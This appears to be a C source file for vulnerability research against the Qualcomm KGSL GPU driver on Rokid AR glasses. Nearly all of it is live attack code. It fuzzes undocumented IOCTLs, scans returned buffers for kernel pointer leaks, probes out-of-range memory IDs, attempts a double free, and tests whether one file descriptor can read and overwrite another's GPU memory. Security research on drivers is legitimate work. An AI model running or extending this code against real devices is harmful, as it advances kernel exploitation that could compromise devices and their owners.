/*
 * KGSL Comprehensive Attack Research v2
 * ======================================
 *
 * Deep dive into KGSL vulnerabilities based on discovered IOCTLs:
 * - IOCTL 0x38/0x39/0x3a: Unknown commands that return data
 * - IOCTL 0x40: SyncSource related
 * - IOCTL 0x56/0x58: More unknown commands
 * - Double free, type confusion, info leaks
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_research_v2 kgsl_research_v2.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// ============================================================================
// IOCTL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09

// Discovered working IOCTLs
#define IOCTL_CMD_0x38 0xc1000938
#define IOCTL_CMD_0x39 0xc1000939
#define IOCTL_CMD_0x3a 0xc100093a
#define IOCTL_CMD_0x40 0xc1000940
#define IOCTL_CMD_0x56 0xc1000956
#define IOCTL_CMD_0x58 0xc1000958

// Known IOCTLs
#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_GPUMEM_GET_INFO _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_get_info)
#define IOCTL_GPUMEM_FREE _IOW(KGSL_IOC_TYPE, 0x31, struct kgsl_gpumem_free)

// Structures
struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_gpumem_get_info
{
    uint64_t gpuaddr;
    unsigned int id;
    unsigned int flags;
    uint64_t size;
    uint64_t mmapsize;
    uint64_t useraddr;
};

struct kgsl_gpumem_free
{
    unsigned long gpuaddr;
};

// ============================================================================
// Globals
// ============================================================================

int kgsl_fd = -1;

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    printf("%s:\n", desc);
    for (size_t i = 0; i < size && i < 256; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

int check_kernel_ptr(uint64_t val)
{
    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL ||
        (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF8000000000ULL)
    {
        return 1;
    }
    return 0;
}

// ============================================================================
// Analyze discovered IOCTLs
// ============================================================================

void analyze_ioctl_0x38(void)
{
    printf("\n=== Analyzing IOCTL 0x38 (nr=56) ===\n");

    // This IOCTL seems to be GPUMEM_SYNC_CACHE_BULK or similar
    // Try different input patterns

    uint8_t buf[256] = {0};

    // Pattern 1: All zeros
    int ret = ioctl(kgsl_fd, IOCTL_CMD_0x38, buf);
    if (ret == 0)
    {
        printf("[+] IOCTL 0x38 succeeded with zeros\n");
        hexdump("  Output", buf, 64);

        // Check for kernel pointers
        uint64_t *vals = (uint64_t *)buf;
        for (int i = 0; i < 32; i++)
        {
            if (check_kernel_ptr(vals[i]))
            {
                printf("[!!!] Kernel pointer at offset %d: 0x%lx\n", i * 8, vals[i]);
            }
        }
    }

    // Pattern 2: Valid-looking values
    memset(buf, 0, sizeof(buf));
    *(uint64_t *)&buf[0] = 0;  // id_list ptr
    *(uint32_t *)&buf[8] = 1;  // count
    *(uint32_t *)&buf[12] = 1; // op

    ret = ioctl(kgsl_fd, IOCTL_CMD_0x38, buf);
    printf("[*] IOCTL 0x38 with struct: %s\n", ret == 0 ? "OK" : strerror(errno));
}

void analyze_ioctl_0x39(void)
{
    printf("\n=== Analyzing IOCTL 0x39 (nr=57) ===\n");

    // nr=57 might be GPUOBJ_ALLOC or similar
    uint8_t buf[256] = {0};

    // Try different sizes
    for (uint64_t size = 0x1000; size <= 0x10000; size *= 2)
    {
        memset(buf, 0, sizeof(buf));
        *(uint64_t *)&buf[0] = size; // size
        *(uint32_t *)&buf[8] = 0;    // flags

        int ret = ioctl(kgsl_fd, IOCTL_CMD_0x39, buf);
        if (ret == 0)
        {
            printf("[+] IOCTL 0x39 size=0x%lx succeeded\n", size);
            hexdump("  Output", buf, 64);
            break;
        }
    }
}

void analyze_ioctl_0x3a(void)
{
    printf("\n=== Analyzing IOCTL 0x3a (nr=58) ===\n");

    // nr=58 might be GPUOBJ_FREE or GPUOBJ_INFO
    uint8_t buf[256] = {0};

    // First allocate something
    struct gpumem_alloc_req alloc = {0};
    alloc.size = 0x1000;
    if (ioctl(kgsl_fd, IOCTL_GPUMEM_ALLOC, &alloc) == 0)
    {
        printf("[+] Allocated gpuaddr=0x%lx for testing\n", alloc.gpuaddr);

        // Try with gpuaddr
        memset(buf, 0, sizeof(buf));
        *(uint64_t *)&buf[0] = alloc.gpuaddr;

        int ret = ioctl(kgsl_fd, IOCTL_CMD_0x3a, buf);
        if (ret == 0)
        {
            printf("[+] IOCTL 0x3a with gpuaddr succeeded\n");
            hexdump("  Output", buf, 64);
        }
        else
        {
            printf("[-] IOCTL 0x3a failed: %s\n", strerror(errno));
        }

        // Try with ID
        memset(buf, 0, sizeof(buf));
        *(uint32_t *)&buf[0] = 1; // id = 1

        ret = ioctl(kgsl_fd, IOCTL_CMD_0x3a, buf);
        if (ret == 0)
        {
            printf("[+] IOCTL 0x3a with id=1 succeeded\n");
            hexdump("  Output", buf, 64);
        }
    }
}

void analyze_ioctl_0x56(void)
{
    printf("\n=== Analyzing IOCTL 0x56 (nr=86) ===\n");

    // nr=86 is in sparse memory range (0x50+)
    // Might be SPARSE_UNBIND or similar
    uint8_t buf[256] = {0};

    int ret = ioctl(kgsl_fd, IOCTL_CMD_0x56, buf);
    if (ret == 0)
    {
        printf("[+] IOCTL 0x56 succeeded\n");
        hexdump("  Output", buf, 64);
    }
    else
    {
        printf("[-] IOCTL 0x56 failed: %s\n", strerror(errno));
    }
}

void analyze_ioctl_0x58(void)
{
    printf("\n=== Analyzing IOCTL 0x58 (nr=88) ===\n");

    // nr=88 is beyond sparse range
    uint8_t buf[256] = {0};

    int ret = ioctl(kgsl_fd, IOCTL_CMD_0x58, buf);
    if (ret == 0)
    {
        printf("[+] IOCTL 0x58 succeeded\n");
        hexdump("  Output", buf, 64);
    }
    else
    {
        printf("[-] IOCTL 0x58 failed: %s\n", strerror(errno));
    }
}

// ============================================================================
// Test GPU Memory Info Leak
// ============================================================================

void test_gpumem_info_leak(void)
{
    printf("\n=== GPU Memory Info Leak Research ===\n");

// Allocate multiple memory regions
#define ALLOC_COUNT 10
    uint64_t gpuaddrs[ALLOC_COUNT];
    int count = 0;

    for (int i = 0; i < ALLOC_COUNT; i++)
    {
        struct gpumem_alloc_req alloc = {0};
        alloc.size = 0x1000;
        if (ioctl(kgsl_fd, IOCTL_GPUMEM_ALLOC, &alloc) == 0)
        {
            gpuaddrs[count++] = alloc.gpuaddr;
        }
    }
    printf("[+] Allocated %d regions\n", count);

    // Query info for each
    for (int i = 0; i < count; i++)
    {
        struct kgsl_gpumem_get_info info = {0};
        info.gpuaddr = gpuaddrs[i];

        if (ioctl(kgsl_fd, IOCTL_GPUMEM_GET_INFO, &info) == 0)
        {
            printf("  [%d] gpuaddr=0x%lx id=%u flags=0x%x size=0x%lx useraddr=0x%lx\n",
                   i, info.gpuaddr, info.id, info.flags, info.size, info.useraddr);

            if (check_kernel_ptr(info.useraddr))
            {
                printf("[!!!] KERNEL POINTER IN USERADDR!\n");
            }
        }
    }

    // Try to query with out-of-bounds IDs
    printf("\n[*] Probing IDs 0-200...\n");
    for (unsigned int id = 0; id <= 200; id++)
    {
        struct kgsl_gpumem_get_info info = {0};
        info.id = id;

        if (ioctl(kgsl_fd, IOCTL_GPUMEM_GET_INFO, &info) == 0)
        {
            printf("  ID=%u: gpuaddr=0x%lx size=0x%lx useraddr=0x%lx\n",
                   id, info.gpuaddr, info.size, info.useraddr);
        }
    }
}

// ============================================================================
// Test Property Leak
// ============================================================================

void test_property_exhaustive(void)
{
    printf("\n=== Exhaustive Property Query ===\n");

    uint8_t buf[1024];

    for (unsigned int type = 0; type <= 0x30; type++)
    {
        memset(buf, 0, sizeof(buf));

        struct kgsl_device_getproperty prop = {
            .type = type,
            .value = buf,
            .sizebytes = sizeof(buf)};

        if (ioctl(kgsl_fd, IOCTL_DEVICE_GETPROPERTY, &prop) == 0)
        {
            printf("[+] Property 0x%02x returned data\n", type);

            // Scan for kernel pointers
            uint64_t *vals = (uint64_t *)buf;
            int kernel_ptrs = 0;
            for (int i = 0; i < 128; i++)
            {
                if (check_kernel_ptr(vals[i]))
                {
                    printf("  [!!!] Kernel ptr at +%d: 0x%lx\n", i * 8, vals[i]);
                    kernel_ptrs++;
                }
            }

            if (kernel_ptrs == 0)
            {
                // Show first 64 bytes
                hexdump("  Data", buf, 64);
            }
        }
    }
}

// ============================================================================
// Test Double Free via Different Interfaces
// ============================================================================

void test_double_free(void)
{
    printf("\n=== Double Free Attack ===\n");

    // Allocate
    struct gpumem_alloc_req alloc = {0};
    alloc.size = 0x1000;

    if (ioctl(kgsl_fd, IOCTL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] Alloc failed\n");
        return;
    }
    printf("[+] Allocated gpuaddr=0x%lx\n", alloc.gpuaddr);

    // mmap it
    void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, kgsl_fd, alloc.gpuaddr);
    if (ptr != MAP_FAILED)
    {
        printf("[+] Mapped at %p\n", ptr);
        *(volatile uint64_t *)ptr = 0xDEADBEEFCAFEBABEULL;
    }

    // Free it
    struct kgsl_gpumem_free gfree = {.gpuaddr = alloc.gpuaddr};
    if (ioctl(kgsl_fd, IOCTL_GPUMEM_FREE, &gfree) == 0)
    {
        printf("[+] First free OK\n");
    }

    // Try second free
    if (ioctl(kgsl_fd, IOCTL_GPUMEM_FREE, &gfree) == 0)
    {
        printf("[!!!] DOUBLE FREE SUCCEEDED!\n");
    }
    else
    {
        printf("[*] Double free prevented: %s\n", strerror(errno));
    }

    // Try via IOCTL 0x3a (possibly GPUOBJ_FREE)
    uint8_t buf[256] = {0};
    *(uint64_t *)&buf[0] = alloc.gpuaddr;
    if (ioctl(kgsl_fd, IOCTL_CMD_0x3a, buf) == 0)
    {
        printf("[!!!] IOCTL 0x3a on freed memory succeeded!\n");
    }

    // Check if mapping is still valid
    if (ptr != MAP_FAILED)
    {
        uint64_t val = *(volatile uint64_t *)ptr;
        printf("[*] Mapping still reads: 0x%lx\n", val);
        munmap(ptr, 0x1000);
    }
}

// ============================================================================
// Cross-FD with Type Confusion
// ============================================================================

void test_crossfd_type_confusion(void)
{
    printf("\n=== Cross-FD Type Confusion ===\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);

    if (fd1 < 0 || fd2 < 0)
    {
        printf("[-] Cannot open FDs\n");
        return;
    }
    printf("[+] fd1=%d, fd2=%d\n", fd1, fd2);

    // fd1 allocates
    struct gpumem_alloc_req alloc = {0};
    alloc.size = 0x1000;

    if (ioctl(fd1, IOCTL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] fd1 alloc failed\n");
        close(fd1);
        close(fd2);
        return;
    }
    printf("[+] fd1 allocated gpuaddr=0x%lx\n", alloc.gpuaddr);

    // fd1 maps
    void *ptr1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd1, alloc.gpuaddr);
    if (ptr1 != MAP_FAILED)
    {
        *(volatile uint64_t *)ptr1 = 0xAAAABBBBCCCCDDDDULL;
        printf("[+] fd1 wrote marker\n");
    }

    // fd2 allocates its own
    struct gpumem_alloc_req alloc2 = {0};
    alloc2.size = 0x1000;
    ioctl(fd2, IOCTL_GPUMEM_ALLOC, &alloc2);
    printf("[+] fd2 allocated gpuaddr=0x%lx\n", alloc2.gpuaddr);

    // fd2 tries to access fd1's memory via gpuaddr
    void *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd2, alloc.gpuaddr);
    if (ptr2 != MAP_FAILED)
    {
        uint64_t val = *(volatile uint64_t *)ptr2;
        printf("[+] fd2 direct gpuaddr access: 0x%lx\n", val);

        if (val == 0xAAAABBBBCCCCDDDDULL)
        {
            printf("[!!!] CROSS-FD ACCESS VIA GPUADDR CONFIRMED!\n");

            // Can we corrupt?
            *(volatile uint64_t *)ptr2 = 0x1111222233334444ULL;
            printf("[+] fd2 wrote corruption\n");

            // Check from fd1
            if (ptr1 != MAP_FAILED)
            {
                uint64_t v = *(volatile uint64_t *)ptr1;
                printf("[+] fd1 now sees: 0x%lx\n", v);
                if (v == 0x1111222233334444ULL)
                {
                    printf("[!!!] CROSS-FD WRITE CONFIRMED!\n");
                }
            }
        }
        munmap(ptr2, 0x1000);
    }

    // fd2 tries via cross-fd offset formula
    uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
    off_t offset = (page_idx + 1) * 0x1000;

    void *ptr3 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd2, offset);
    if (ptr3 != MAP_FAILED)
    {
        uint64_t val = *(volatile uint64_t *)ptr3;
        printf("[+] fd2 offset formula access: 0x%lx\n", val);
        munmap(ptr3, 0x1000);
    }

    // Cleanup
    if (ptr1 != MAP_FAILED)
        munmap(ptr1, 0x1000);
    close(fd1);
    close(fd2);
}

// ============================================================================
// Scan for more IOCTLs
// ============================================================================

void scan_ioctls(void)
{
    printf("\n=== Scanning KGSL IOCTLs ===\n");

    uint8_t buf[256];
    int found = 0;

    // Scan nr 0x00 to 0x70
    for (int nr = 0; nr <= 0x70; nr++)
    {
        memset(buf, 0, sizeof(buf));

        // Try with 256-byte R/W
        unsigned long cmd = _IOWR(0x09, nr, char[256]);
        int ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0)
        {
            printf("[+] IOCTL nr=0x%02x (cmd=0x%lx) succeeded\n", nr, cmd);
            found++;

            // Check for data
            int has_data = 0;
            for (int i = 0; i < 64; i++)
            {
                if (buf[i] != 0)
                {
                    has_data = 1;
                    break;
                }
            }
            if (has_data)
            {
                hexdump("  Data", buf, 64);
            }
        }
    }

    printf("[*] Found %d working IOCTLs\n", found);
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Comprehensive Attack Research v2                        ║\n");
    printf("║  Target: Rokid AR Glasses (Kernel 5.10.209)                   ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] kgsl_fd = %d\n", kgsl_fd);

    // Run analyses
    analyze_ioctl_0x38();
    analyze_ioctl_0x39();
    analyze_ioctl_0x3a();
    analyze_ioctl_0x56();
    analyze_ioctl_0x58();

    test_gpumem_info_leak();
    test_property_exhaustive();
    test_double_free();
    test_crossfd_type_confusion();

    scan_ioctls();

    close(kgsl_fd);

    printf("\n=== Research Complete ===\n");
    return 0;
}
